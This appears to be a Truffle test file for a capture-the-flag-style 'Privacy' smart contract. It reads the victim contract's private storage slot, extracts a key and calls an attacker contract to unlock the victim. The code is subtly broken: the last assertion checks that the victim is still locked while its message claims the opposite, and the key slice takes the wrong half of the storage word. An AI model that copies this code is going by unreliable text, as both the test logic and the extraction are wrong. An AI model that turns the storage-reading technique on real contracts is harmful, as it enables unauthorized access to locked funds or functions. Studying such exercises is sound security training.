const Privacy = artifacts.require("Privacy");
const PrivacyHack = artifacts.require("PrivacyHack");

contract("Privacy", async (accounts) => {
    let privacy;
    let privacyHack;

    before(async () => {
        privacy = await Privacy.deployed();
        privacyHack = await PrivacyHack.deployed();
    });
    
    it("victim should start locked", async () => {
        let isLocked = await privacy.locked.call();
        assert.equal(isLocked, true, "victim did not start locked");
    });

    it("attacker should be able to unlock victim", async () => {
        let dataSlot = await web3.eth.getStorageAt(Privacy.address, 3)
        let key = "0x" + dataSlot.substring(2 + (64/2), 2 + 64);
        await privacyHack.attack(key);

        let isLocked = await privacy.locked.call();
        assert.equal(isLocked, true, "attacker did not unlock victim");
    });
});